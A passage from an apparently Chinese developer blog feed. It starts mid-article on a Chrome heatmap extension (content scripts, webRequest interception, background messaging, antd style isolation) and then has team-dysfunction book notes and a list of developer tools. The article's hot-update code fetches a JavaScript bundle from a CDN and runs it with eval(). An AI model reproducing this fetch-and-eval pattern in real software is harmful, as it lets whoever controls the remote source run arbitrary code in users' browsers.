class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (el.contains(rectCt)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> rectLT = elementFromPoint(rect.left + visibleDiffX,  rect.top + visibleDiffY);</span><br><span class="line">  <span class="keyword">if</span> (el.contains(rectLT)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> rectRT = elementFromPoint(rect.right - visibleDiffX, rect.top + visibleDiffY);</span><br><span class="line">  <span class="keyword">if</span> (el.contains(rectRT)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="数据的重绘"><a href="#数据的重绘" class="headerlink" title="数据的重绘"></a>数据的重绘</h2><p>数据重绘的时机有scroll、resize事件触发，另外还有DOM元素变动，比如有的菜单，只有hover后才会生成实际子菜单元素，这就需要利用MutationObserver监听DOM元素变动，从而触发一次重绘，这样才能拿到子菜单的DOM元素，展示数据。</p>
<p>值得一提的是growing.io的热力图是基于iframe实现的，它没有去解决hover才会出现的元素的数据呈现问题，插件解决该问题。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> drawMapHandle = _.debounce(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  drawMap();</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, () =&gt; &#123;</span><br><span class="line">  drawMapHandle();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, () =&gt; &#123;</span><br><span class="line">  drawMapHandle();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> docObserver = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  drawMapHandle();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  childList: <span class="literal">true</span>,</span><br><span class="line">  characterData: <span class="literal">true</span>,</span><br><span class="line">  subtree: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line">docObserver.observe(<span class="built_in">document</span>.body, options);</span><br></pre></td></tr></table></figure>
<h2 id="用户交互"><a href="#用户交互" class="headerlink" title="用户交互"></a>用户交互</h2><p>用户交互的部分（右侧的抽屉）实现比较容易</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> container = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">container.id = TCE_CONTAINER_ID;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(container);</span><br><span class="line">render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(TCE_CONTAINER_ID));</span><br></pre></td></tr></table></figure>
<p>你可以使用react在<code>&lt;App /&gt;</code>中自由地编写交互功能，我们使用的是react+ant design。当然你也可以使用其他技术栈比如vue去开发插件，插件开发并不会限制框架，只要最终可以编译输出js、css就可以了。</p>
<h2 id="AppID获取"><a href="#AppID获取" class="headerlink" title="AppID获取"></a>AppID获取</h2><p>我们有个类似于AppID参数，只有获取到这个参数才好进行无埋点数据的查询。这个参数从业务页面sdk封装的方法上是可以获取到的，然而content script虽然可以操作业务页面的DOM，可无法操作业务页面的js（window也不是同一个，js运行环境是隔离的），所以无法直接获取AppID。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content-script有一个很大的“缺陷”，虽然它可以操作DOM，但是无法访问页面中的JS。而且页面DOM也不能调用它，也就是无法在DOM中通过绑定事件的方式调用content-script中的代码</span><br></pre></td></tr></table></figure>
<p>通过inject script到是可行，在content-script中可以通过DOM操作向页面注入inject-script：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectJs</span>(<span class="params">jsPath</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> jsPath = jsPath || <span class="string">'js/inject.js'</span>;</span><br><span class="line">	<span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">	script.setAttribute(<span class="string">'type'</span>, <span class="string">'text/javascript'</span>);</span><br><span class="line">	script.src = chrome.extension.getURL(jsPath);</span><br><span class="line">	script.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">// 执行完移除掉</span></span><br><span class="line">    script.remove()</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>jsPath指向的就是inject-script，它可以操作页面的js，和写在页面里的js没有什么区别。这样它就可以调用sdk封装的方法拿到AppID了。拿到AppID后，可以利用DOM作为媒介（比如将AppID放到某个DOM的属性上），这样content script就可以从DOM上拿到AppID。</p>
<p>这样显然是比较绕的，而且content script何时能拿到AppID的时机也不好确定，并且还有个问题是不同版本的sdk获取AppID的方式不尽相同。所以最终没有采用这种方式，而是通过拦截http请求，从埋点请求的body中获取AppID（body中AppID的位置在不同版本的sdk中是一致的）。</p>
<p>chrome插件也提供了拦截浏览器发出的请求的能力：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">chrome.webRequest &amp;&amp; chrome.webRequest.onBeforeRequest.addListener(</span><br><span class="line">  (details) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> bytes = details.requestBody.raw[<span class="number">0</span>].bytes;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">    reader.readAsText(<span class="keyword">new</span> Blob([bytes]), <span class="string">'utf-8'</span>);</span><br><span class="line">    reader.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// log就是http body里的内容，从中可以获取到AppID</span></span><br><span class="line">      <span class="keyword">const</span> log = <span class="built_in">JSON</span>.parse(reader.result);</span><br><span class="line">      reader.abort();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    urls:[...TRACK_LOG_URL_LIST],</span><br><span class="line">  &#125;,</span><br><span class="line">  [<span class="string">'requestBody'</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h2 id="跨域传递Cookie失效"><a href="#跨域传递Cookie失效" class="headerlink" title="跨域传递Cookie失效"></a>跨域传递Cookie失效</h2><p>插件查询无埋点数据的接口在content script中必须跨域传递Cookie才能通过鉴权，然而不知道什么原因，同一份代码，有的人可以传递Cookie，而有的人不行。</p>
<p>后来我采用Chrome插件的background（后台）来解决的这个问题，在background中发出的请求，Cookie都可以顺利传递。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;background的权限非常高，几乎可以调用所有的Chrome扩展API（除了devtools），而且它可以无限制跨域，也就是可以跨域访问任何网站而无需要求对方设置CORS。&quot;</span><br></pre></td></tr></table></figure>
<p>不过，使用background增加了代码的复杂度。因为我们的主要功能都是在content script中实现的，这就造成了请求的执行必须由content script先发送消息给backgroud，告诉说我要执行一个请求（比如queryElementPvUv），backgroud监听content script的消息，执行queryElementPvUv请求，拿到数据后再发送消息给content script。content script监听消息，拿到backgroud返回的数据，最后才能执行相应的操作。</p>
<p>请求流程实现如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// content script</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sendMsg = <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">  chrome.runtime.sendMessage(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// content script发送消息给backgroud，告诉说我要请求queryElementPvUv接口了。</span></span><br><span class="line">sendMsg(&#123;</span><br><span class="line">  type: API_FETCH,</span><br><span class="line">  apiList: [&#123;</span><br><span class="line">    name: apiNames[<span class="string">'queryElementPvUv'</span>],</span><br><span class="line">    params: &#123;&#125;,</span><br><span class="line">  &#125;],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// backgroud</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queryElementPvUv = <span class="keyword">async</span> (params) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> post(queryElementPvUvUrl, params);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> apis = &#123;</span><br><span class="line">  queryElementPvUv,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sendMsg = <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">  chrome.tabs.query(&#123;<span class="attr">windowType</span>: <span class="string">'normal'</span>&#125;, tabs =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> postMessage = <span class="function">(<span class="params">tabId</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (tabId &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> port = chrome.tabs.connect(tabId, &#123;<span class="attr">name</span>: TCE_API_CONNECT&#125;);</span><br><span class="line">        port.postMessage(msg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tabs.length &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">      tabs.forEach(<span class="function"><span class="params">tab</span> =&gt;</span> &#123;</span><br><span class="line">        postMessage(tab.id);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chrome.runtime &amp;&amp; chrome.runtime.onMessage &amp;&amp; chrome.runtime.onMessage.addListener(<span class="keyword">async</span> (request) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; type, apiList &#125; = request;</span><br><span class="line">  <span class="keyword">if</span> (type === API_FETCH &amp;&amp; <span class="built_in">Array</span>.isArray(apiList)) &#123;</span><br><span class="line">    <span class="comment">// backgroud监听到了content script发过来的消息，执行queryElementPvUv请求</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> api <span class="keyword">of</span> apiList) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; name, params &#125; = api;</span><br><span class="line">      <span class="keyword">const</span> res = <span class="keyword">await</span> apis[name](params);</span><br><span class="line">      <span class="comment">// 拿到请求返回的数据后发送消息给content script</span></span><br><span class="line">      sendMsg(&#123;</span><br><span class="line">        type: API_FETCH,</span><br><span class="line">        payload: &#123;</span><br><span class="line">          apiName: name,</span><br><span class="line">          ...res,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// content script</span></span><br><span class="line">chrome.runtime.onConnect.addListener(<span class="function">(<span class="params">port</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (port.name === TCE_API_CONNECT) &#123;</span><br><span class="line">    port.onMessage.addListener(<span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; type &#125; = msg;</span><br><span class="line">        <span class="keyword">if</span> (type === API_FETCH) &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; payload  &#125; = msg;</span><br><span class="line">          <span class="keyword">const</span> &#123; apiName &#125; = payload;</span><br><span class="line">          <span class="keyword">if</span> (apiName === apiNames[<span class="string">'queryElementPvUv'</span>]) &#123;</span><br><span class="line">            <span class="comment">// content script监听到了backgroud发过来的请求返回数据，执行相应逻辑</span></span><br><span class="line">            apiQueryElementPvUvHandle(msg);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="样式冲突问题"><a href="#样式冲突问题" class="headerlink" title="样式冲突问题"></a>样式冲突问题</h2><p>插件样式与业务页面会有样式冲突问题。</p>
<p>插件自定义的css样式可以通过css moudule来解决冲突问题。</p>
<p>但是插件还使用了ant design组件库，它会带来两个问题：</p>
<ol>
<li><p>如果业务页面也使用了ant design，样式会相互影响。</p>
</li>
<li><p>ant design会自动引入一份<code>~antd/lib/style/core/base.less</code>来初始化页面的样式，这意味着只要开启了插件，即使业务页面没有使用ant design，base.less也会影响业务页面的样式（比如a标签样式）。</p>
</li>
</ol>
<p>问题1的解决方法和css moudule的原理一样，ant design支持自定义样式的class前缀。</p>
<p>在webpack中配置：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> HappyPack(&#123;</span><br><span class="line">  id: <span class="string">'less'</span>,</span><br><span class="line">  loaders: [</span><br><span class="line">    <span class="string">'style-loader'</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'css-loader'</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      loader: <span class="string">'less-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        modifyVars: &#123;</span><br><span class="line">          <span class="string">'ant-prefix'</span>: <span class="string">'tce'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        javascriptEnabled: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  threadPool: happyThreadPool,</span><br><span class="line">&#125;),</span><br></pre></td></tr></table></figure>
<p>配合ConfigProvider使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  ConfigProvider,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ConfigProvider prefixCls=<span class="string">"tce"</span>&gt;</span><br><span class="line">      ...</span><br><span class="line">    &lt;ConfigProvider&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题2我是通过改变ant design样式的引入方式实现的。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* antd-custom-dist.less */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">'~antd/lib/style/themes/index.less'</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">'~antd/lib/style/mixins/index.less'</span>;</span><br><span class="line"></span><br><span class="line">*<span class="selector-attr">[class*=<span class="string">'tce-'</span>]</span> &#123;</span><br><span class="line">  @import '~antd/lib/style/core/base.less';</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">'~antd/lib/style/core/iconfont.less'</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">'~antd/lib/style/core/motion.less'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">'~antd/lib/style/components.less'</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'../../antd-custom-dist.less'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line">resolve: &#123;</span><br><span class="line">  alias: &#123;</span><br><span class="line">    <span class="string">'antd/dist/antd.less$'</span>: path.resolve(__dirname, <span class="string">'../src/antd-custom-dist.less'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>这样即使你开着插件，访问其他页面(比如毫不相关的百度首页)，虽然content script会执行，但是base.less并不会加载，页面的样式不会受影响。</p>
<p>缺点就是ant design的样式必须采用全量加载的形式，增加了输出的bundle.js的体积。之前还看到另一种可以按需加载的实现方式，不过还没有实践过。</p>
<h2 id="热更新"><a href="#热更新" class="headerlink" title="热更新"></a>热更新</h2><p>热更新的实现逻辑很简单，我们最终输出的是webpack打包后的bundle.js，我们将其上传到cdn上，并带上版本号。</p>
<p>用户每次加载插件的时候需要先调用接口获取版本号，再使用版本号去cdn上获取对应的bundle.js。</p>
<p>所以我们在发布的时候只需要改变一下版本号就可以了，用户代码也会自动更新。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; CDN_URL, QUERY_VERSION_URL &#125; <span class="keyword">from</span> <span class="string">'../../../constant'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> env = process.env.NODE_ENV;</span><br><span class="line"><span class="keyword">const</span> queryVersionUrl = QUERY_VERSION_URL[env];</span><br><span class="line"><span class="keyword">const</span> heatmapUrl = CDN_URL.heatmap;</span><br><span class="line"></span><br><span class="line">axios.get(queryVersionUrl).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  res = res.data;</span><br><span class="line">  <span class="keyword">if</span> (res.code === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> version = res.data;</span><br><span class="line">    <span class="keyword">const</span> versionUrl = <span class="string">`<span class="subst">$&#123;heatmapUrl&#125;</span>-<span class="subst">$&#123;version&#125;</span>.js`</span></span><br><span class="line">    axios.get(versionUrl).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">eval</span>(res.data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.cnblogs.com/liuxianan/p/chrome-plugin-develop.html" target="_blank" rel="noopener">【干货】Chrome插件(扩展)开发全攻略</a></li>
<li><a href="https://github.com/pa7/heatmap.js" target="_blank" rel="noopener">heatmap.js</a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>JavaScript高级程序设计</title>
    <url>/2020/11/16/JavaScript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p>JavaScript高级程序设计<br><a id="more"></a></p>
]]></content>
  </entry>
  <entry>
    <title>《团队协作的五大障碍》</title>
    <url>/2020/12/05/%E5%9B%A2%E9%98%9F%E5%8D%8F%E4%BD%9C%E7%9A%84%E4%BA%94%E5%A4%A7%E9%9A%9C%E7%A2%8D/</url>
    <content><![CDATA[<p>团队协作有时会不自觉地陷入五个很普通但却很危险的沼泽之中，这里称其为团队协作的五大障碍。</p>
<ol>
<li><p>缺乏信任</p>
</li>
<li><p>惧怕冲突</p>
</li>
<li><p>欠缺投入</p>
</li>
<li><p>逃避责任</p>
</li>
<li><p>无视结果</p>
</li>
</ol>
<h1 id="五大障碍"><a href="#五大障碍" class="headerlink" title="五大障碍"></a>五大障碍</h1><h2 id="缺乏信任"><a href="#缺乏信任" class="headerlink" title="缺乏信任"></a>缺乏信任</h2><p>一般说来，信任是指以过去的经验为根据对一个人的行为作出预测。例如，我们相信一名一贯表现优秀的成员能够高质量地完成任务。</p>
<p>谈到建立企业团队，信任是指团队成员相信同事的言行是出于好意，在团队里不必过分小心或相互戒备。事实上，团队成员必须放心地接受彼此的批评。</p>
<p>当然，这是很理想的情况，只有非常优秀的团队能够建立起这种信任。这需要团队成员敢于承认自己的弱项，而且不用担心别人会以此来攻击自己。这些弱项包括性格弱点、技术不足、人际交往的困扰、失误以及无法独立完成任务、需要别人的帮助等。</p>
<p>只有当团队成员真正放心地把自己暴露在别人面前时，他们才能完全消除戒心，从而把全部精力集中到工作上，不用钩心斗角，尔虞我诈。</p>
<p>要在暴露弱点的基础上建立信任是非常不容易的，因为大多数成功人士在事业和学习过程中已经习惯了相互竞争、彼此戒备。要使他们为了团队的利益而摒弃这些几乎成为本能的东西，虽然不容易做到，但却是好的团队所必需的。</p>
<h2 id="惧怕冲突"><a href="#惧怕冲突" class="headerlink" title="惧怕冲突"></a>惧怕冲突</h2><p>缺乏信任的团队无法产生直接而激烈的思想交锋，取而代之的是毫无针对性的讨论以及无关痛痒的意见。</p>
<h2 id="欠缺投入"><a href="#欠缺投入" class="headerlink" title="欠缺投入"></a>欠缺投入</h2><p>团队成员如果无法在热烈、公开的辩论中表达自己的意见，即使在会议中达成表面上的一致，也会欠缺投入。</p>
<p>欠缺投入有两个最重要原因，就是追求绝对一致和绝对把握。</p>
<ol>
<li><p>不要追求绝对一致：优秀的团队能够理解，追求意见绝对一致的代价太大，所以他们能够互相作出必要的让步。这促使大家在不可能完全取得一致意见的情况下，也可以达成共识。</p>
</li>
<li><p>不要追求绝对把握：优秀的团队会因大家齐心协力地制定出目标并为之奋斗而感到自豪，尽管有时候他们并没有把握所作出的决定是否正确。</p>
</li>
</ol>
<h2 id="逃避责任"><a href="#逃避责任" class="headerlink" title="逃避责任"></a>逃避责任</h2><p>因为欠缺投入，且实际上并没有达成共识，团队成员就会逃避责任。</p>
<p>在团队协作中，逃避责任是指团队成员在看到同事的表现或行为有碍于集体利益的时候，不能够及时给予提醒。</p>
<p>团队成员逃避责任主要是因为不愿在指出别人不妥的行为之后，造成人际关系上的紧张，或者他们倾向于有意避免不快的谈话。</p>
<p>实际上，要保持团队高效率地工作，最有效方式就是同事间相互施加压力。这样做有许多好处，例如不再需要那么多绩效管理及改进计划等过度形式主义的措施。害怕辜负同事的期望，这比任何规定和制度都更能够促使成员们努力工作。</p>
<h2 id="无视结果"><a href="#无视结果" class="headerlink" title="无视结果"></a>无视结果</h2><p>如果团队成员不能相互负责、督促，团队成员很可能会把个人的需要（如个人利益、职业前途或能力认可）或甚至他们的分支部门的利益放在整个团队的共同利益之上时，就导致了无视结果。</p>
<h1 id="克服五大障碍的一些方法"><a href="#克服五大障碍的一些方法" class="headerlink" title="克服五大障碍的一些方法"></a>克服五大障碍的一些方法</h1><h2 id="克服：缺乏信任"><a href="#克服：缺乏信任" class="headerlink" title="克服：缺乏信任"></a>克服：缺乏信任</h2><p>基于暴露弱点的信任不是一夜之间就可以树立的，这需要成员们长期同甘共苦，慢慢了解彼此的个性。不过，通过努力，一支团队可以大大缩短建立信任所需的时间，在相对较短的时间内取得相互信任。以下是一些特定的方法。</p>
<ol>
<li><p>个人背景介绍</p>
</li>
<li><p>成员工作效率讨论</p>
</li>
</ol>
<p>这项活动比前一项活动更具有力度和针对性，难度也相应较大。这需要团队成员指出同事为团队作出的最大贡献，以及最需要改进的地方，然后大家一起就每个人所说的进行讨论，讨论的对象通常可以从团队的领导者开始。</p>
<p>虽然这项活动看起来可能有些冒险，容易造成不满，但我们会惊喜地发现在一个小时之内，我们就能获得许多建设性的、有益的信息，而且活动通常会进行得很顺利。</p>
<ol start="3">
<li><p>意见反馈</p>
</li>
<li><p>团建</p>
</li>
</ol>
<p>…</p>
<h2 id="克服：惧怕冲突"><a href="#克服：惧怕冲突" class="headerlink" title="克服：惧怕冲突"></a>克服：惧怕冲突</h2><ol>
<li>挖掘争论话题</li>
</ol>
<p>讨论要体现出客观性，大家都要有决心投入争论中，直到问题解决为止。</p>
<p>…</p>
<h2 id="克服：欠缺投入"><a href="#克服：欠缺投入" class="headerlink" title="克服：欠缺投入"></a>克服：欠缺投入</h2><ol>
<li>统一口径</li>
</ol>
<p>在团队会议结束的时候，大家可以一起清楚地回顾会议上作出的主要决定，以及如何向员工和客户传达相关消息。</p>
<ol start="2">
<li><p>确定最终期限</p>
</li>
<li><p>意外和不利情况的分析</p>
</li>
</ol>
<p>这样可以帮助他们克服对于失败的恐惧，让他们知道一旦决定是错误的，可能发生的情况并不像他们想的那样糟糕。</p>
<ol start="4">
<li>低风险激进法</li>
</ol>
<p>在风险较小的情况下采用激进的方式，即团队在进行了大量讨论之后，强迫自身在调查和分析不足的情况下作出决定，在实践中调整方案。</p>
<p>…</p>
<h2 id="克服：逃避责任"><a href="#克服：逃避责任" class="headerlink" title="克服：逃避责任"></a>克服：逃避责任</h2><p>1.公布工作目标和标准</p>
<p>2.定期对成果进行简要回顾</p>
<p>3.团队嘉奖</p>
<p>…</p>
<h2 id="克服：无视结果"><a href="#克服：无视结果" class="headerlink" title="克服：无视结果"></a>克服：无视结果</h2><p>一个团队怎样确保成员们把重点放在集体成绩上？方法是明确界定集体的工作成绩，并奖励为集体成就贡献力量的成员。</p>
<p>1.公布工作目标</p>
<p>2.奖励集体成就</p>
<p>…</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反过来说，一个真正团结一致的团队会具有如下特征：</p>
<ol>
<li><p>成员之间相互信任。</p>
</li>
<li><p>针对不同意见进行直接的辩论。</p>
</li>
<li><p>积极投入到决策和行动计划中去。</p>
</li>
<li><p>对影响工作计划的行为负责。</p>
</li>
<li><p>把重点放在集体成绩上。</p>
</li>
</ol>
<p>这听起来很简单，因为事情本身就是如此。然而要在实际中做到这些却是难上加难，因为那样需要高度的组织纪律性和持久性，能够做到这些的团队不多。</p>
]]></content>
  </entry>
  <entry>
    <title>开发工具分享</title>
    <url>/2020/12/05/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p>分享一些开发中觉得好用的工具</p>
<h1 id="zsh—shell工具"><a href="#zsh—shell工具" class="headerlink" title="zsh—shell工具"></a>zsh—shell工具</h1><p><a href="https://ohmyz.sh/" target="_blank" rel="noopener">网站</a></p>
<p>非常好用的shell，支持众多插件和主题。</p>
<h1 id="TODO-TREE"><a href="#TODO-TREE" class="headerlink" title="TODO TREE"></a>TODO TREE</h1><p>VS Code插件，可以显示代码中的TODO。</p>
<h1 id="Postman—接口调试"><a href="#Postman—接口调试" class="headerlink" title="Postman—接口调试"></a>Postman—接口调试</h1><p><a href="https://www.postman.com/" target="_blank" rel="noopener">网站</a></p>
<p>可以很方便地发送http请求，调试接口。</p>
<h1 id="Charles—抓包工具"><a href="#Charles—抓包工具" class="headerlink" title="Charles—抓包工具"></a>Charles—抓包工具</h1><p><a href="https://www.charlesproxy.com/" target="_blank" rel="noopener">网站</a></p>
<p>抓包工具，抓取页面的http请求。</p>
<h1 id="caniuse—查看兼容性"><a href="#caniuse—查看兼容性" class="headerlink" title="caniuse—查看兼容性"></a>caniuse—查看兼容性</h1><p><a href="https://www.caniuse.com/" target="_blank" rel="noopener">网站</a></p>
<p>查询CSS、JS语法在浏览器中的兼容性。</p>
<h1 id="GitBook—编写书籍"><a href="#GitBook—编写书籍" class="headerlink" title="GitBook—编写书籍"></a>GitBook—编写书籍</h1><p><a href="https://www.gitbook.com/" target="_blank" rel="noopener">网站</a></p>
<p>使用Git和Markdown来编写你的书籍。</p>
<h1 id="reveal-js—PPT制作"><a href="#reveal-js—PPT制作" class="headerlink" title="reveal.js—PPT制作"></a>reveal.js—PPT制作</h1><p><a href="https://github.com/hakimel/reveal.js/" target="_blank" rel="noopener">github地址</a></p>
<p>使用markdown或者写代码的方式高效制作PPT。</p>
<h1 id="Typora—Markdown编辑器"><a href="#Typora—Markdown编辑器" class="headerlink" title="Typora—Markdown编辑器"></a>Typora—Markdown编辑器</h1><p><a href="https://www.typora.io/" target="_blank" rel="noopener">网站</a></p>
<p>免费的轻量级Markdown编辑器</p>
<h1 id="稿定设计—在线的photoshop"><a href="#稿定设计—在线的photoshop" class="headerlink" title="稿定设计—在线的photoshop"></a>稿定设计—在线的photoshop</h1><p><a href="https://ps.gaoding.com/#/" target="_blank" rel="noopener">网站</a></p>
<h1 id="processon—画图工具"><a href="#processon—画图工具" class="headerlink" title="processon—画图工具"></a>processon—画图工具</h1><p><a href="https://www.processon.com/" target="_blank" rel="noopener">网站</a></p>
<p>在线流程图，UML，原型图等。</p>
<h1 id="iconfont—海量icon"><a href="#iconfont—海量icon" class="headerlink" title="iconfont—海量icon"></a>iconfont—海量icon</h1><p><a href="https://www.iconfont.cn/" target="_blank" rel="noopener">网站</a></p>
<h1 id="二维码生成工具"><a href="#二维码生成工具" class="headerlink" title="二维码生成工具"></a>二维码生成工具</h1><p><a href="https://cli.im/" target="_blank" rel="noopener">网站</a></p>
<h1 id="ESLint—代码检查"><a href="#ESLint—代码检查" class="headerlink" title="ESLint—代码检查"></a>ESLint—代码检查</h1><p>代码规范检查及修复</p>
<h1 id="Prettier—代码格式化"><a href="#Prettier—代码格式化" class="headerlink" title="Prettier—代码格式化"></a>Prettier—代码格式化</h1><p>代码格式化</p>
<h1 id="JSONView—json格式化"><a href="#JSONView—json格式化" class="headerlink" title="JSONView—json格式化"></a>JSONView—json格式化</h1><p>Chrome插件</p>
<p>json格式化和高亮，看接口数据就很方便了。</p>
<h1 id="json在线格式化"><a href="#json在线格式化" class="headerlink" title="json在线格式化"></a>json在线格式化</h1><p><a href="https://www.sojson.com/" target="_blank" rel="noopener">网站</a></p>
